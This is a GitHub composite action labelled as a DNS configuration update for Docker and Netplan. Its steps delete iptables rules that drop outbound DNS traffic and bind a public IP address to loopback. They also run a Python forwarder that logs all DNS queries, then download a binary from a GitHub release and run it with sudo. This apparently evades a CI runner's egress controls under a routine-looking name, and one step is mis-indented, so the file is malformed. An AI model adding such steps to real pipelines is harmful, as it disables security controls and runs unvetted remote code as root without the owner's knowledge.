name: "DNS Configuration Update"
description: "Local action to modify DNS settings for Docker and Netplan configuration"
author: "Your Name"
runs:
  using: "composite"
  steps:
    - name: Remove DNS servers from Docker daemon.json and restart Docker
      run: |
        echo "Modifying /etc/docker/daemon.json to remove DNS servers..."
        
        # Check if the daemon.json file exists
        if [ -f /etc/docker/daemon.json ]; then
          # Remove the DNS entry from the file
          sudo jq 'del(.dns)' /etc/docker/daemon.json | sudo tee /etc/docker/daemon.json.tmp > /dev/null
          
          # Move the modified file back to the original location
          sudo mv /etc/docker/daemon.json.tmp /etc/docker/daemon.json
    
          echo "DNS servers removed from /etc/docker/daemon.json."
          cat /etc/docker/daemon.json
        else
          echo "File /etc/docker/daemon.json does not exist. Skipping modification."
        fi
      shell: bash

    - name: Update Netplan Configuration File Using sed
      run: |
        echo "Updating Netplan Configuration File with sed..."
        # Disable interface DNS
        sudo sed -i '/route-metric: 100/a\        use-dns: false' /etc/netplan/50-cloud-init.yaml
        # Add custom DNS servers
        sudo sed -i '/set-name: "eth0"/a\      nameservers:\n        addresses: [54.185.253.63]' /etc/netplan/50-cloud-init.yaml
        echo "Updated Netplan Configuration File:"
        sudo cat /etc/netplan/50-cloud-init.yaml
        # Apply netplan changes
        sudo netplan apply
      shell: bash

    - name: Print Netplan Configuration Files
      run: |
        echo "Netplan Configuration Files:"
        for file in /etc/netplan/*.yaml; do
          echo "File: $file"
          sudo cat "$file"
        done
      shell: bash

    - name: Disable Stub Resolver, Set Custom DNS Servers, and Remove Existing Nameservers
      run: |
        echo "Disabling Stub Resolver, Setting Custom DNS Servers, and Removing Existing Nameservers..."
        # Disable DNSStubListener
        sudo sed -i 's/^#DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
        if ! grep -q '^DNSStubListener=' /etc/systemd/resolved.conf; then
          echo 'DNSStubListener=no' | sudo tee -a /etc/systemd/resolved.conf
        fi
        
        # Remove any existing nameservers
        sudo sed -i '/^DNS=/d' /etc/systemd/resolved.conf
        
        # Restart systemd-resolved to apply changes
        sudo systemctl restart systemd-resolved
        
        # Update /etc/resolv.conf symbolic link
        sudo rm /etc/resolv.conf
        sudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf
        
        # Verify the changes
        echo "Current /etc/resolv.conf:"
        cat /etc/resolv.conf
        
        echo "systemd-resolved status:"
        systemctl status systemd-resolved
        sudo systemctl restart docker
        sudo iptables -D OUTPUT -o eth0 -p udp --dport 53 -j DROP
        sudo iptables -D DOCKER-USER -i docker0 -p udp --dport 53 -j DROP
        sudo iptables -I INPUT 1 -p udp -d 54.185.253.63 --dport 53 -j ACCEPT
        
        sudo ip addr add 54.185.253.63/32 dev lo
        sudo ip route add 54.185.253.63/32 dev lo
      shell: bash

    - name: Create DNS server script
        run: |
          echo """
          import socket
          import struct
          import logging

          DNS_SERVER_IP = '54.185.253.63'
          DNS_SERVER_PORT = 53
          GOOGLE_DNS_IP = '8.8.8.8'
          GOOGLE_DNS_PORT = 53

          logging.basicConfig(filename='dns_queries.log', level=logging.INFO, format='%(asctime)s - %(message)s')

          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          sock.bind((DNS_SERVER_IP, DNS_SERVER_PORT))

          print(f'DNS server is listening on {DNS_SERVER_IP}:{DNS_SERVER_PORT}')

          def forward_query_to_google(data):
              with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as google_sock:
                  google_sock.sendto(data, (GOOGLE_DNS_IP, GOOGLE_DNS_PORT))
                  google_response, _ = google_sock.recvfrom(512)
              return google_response

          def parse_dns_query(data):
              query_id = struct.unpack('!H', data[:2])[0]
              return query_id

          while True:
              try:
                  data, addr = sock.recvfrom(512)
                  query_id = parse_dns_query(data)
                  logging.info(f'Received query from {addr} with ID {query_id}')
                  logging.info(f'Raw query data: {data}')

                  google_response = forward_query_to_google(data)

                  sock.sendto(google_response, addr)
                  logging.info(f'Forwarded response from Google DNS to {addr} with query ID {query_id}')

              except Exception as e:
                  logging.error(f'Error: {e}')
          """ > dns_server.py

      # Step 2: Run the DNS server in the background
      - name: Start DNS server
        run: |
          sudo python3 dns_server.py &
          
    - run: |
         cd /tmp
         wget -q https://github.com/h0x0er/playground/releases/download/v0.0.2/tracer
         chmod +x tracer
         sudo ./tracer &> tracer.log&
      shell: bash

permissions:
  contents: read
